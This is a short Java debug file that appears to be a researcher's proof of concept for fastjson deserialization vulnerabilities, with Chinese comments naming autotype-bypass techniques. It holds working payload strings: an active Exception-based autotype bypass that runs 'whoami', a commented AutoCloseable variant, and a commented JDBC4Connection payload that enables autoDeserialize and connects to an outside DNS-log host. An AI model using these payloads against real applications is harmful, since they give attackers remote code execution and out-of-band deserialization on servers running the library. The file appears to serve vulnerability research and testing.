package com.sorry.bug;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.alibaba.fastjson.serializer.StringCodec;
import com.mysql.jdbc.JDBC4Connection;
import com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor;
import jdk.nashorn.api.scripting.URLReader;

import java.io.IOException;

/**
 * created by 0x22cb7139 on 2021/6/28
 */
public class Debug {
    public static void main(String[] args) throws IOException {

        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //利用AutoCloseablerable绕过autotype
        //String expStr="{\"a\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sorry.bug.customautocloseable\"},\"b\":{\"@type\":\"com.sorry.bug.customautocloseable\",\"command\":\"whoami\"}}";
        //利用Exception期望类绕过autotype
        String expStr="{\"@type\":\"java.lang.Exception\",\"@type\":\"com.sorry.bug.customException\",\"s\":\"whoami\"}";
        //String expStr="{\"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\":\"3j4mld.dns-log.com\",\"portToConnectTo\":80, \"info\": {\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"useSSL\":\"false\", \"user\":\"cp3\"}, \"databaseToConnectTo\":\"mysql\",\"url\":\"jdbc:mysql://127.0.0.1:3306/mysql\"}}}";
        JSON.parse(expStr);
    }
}
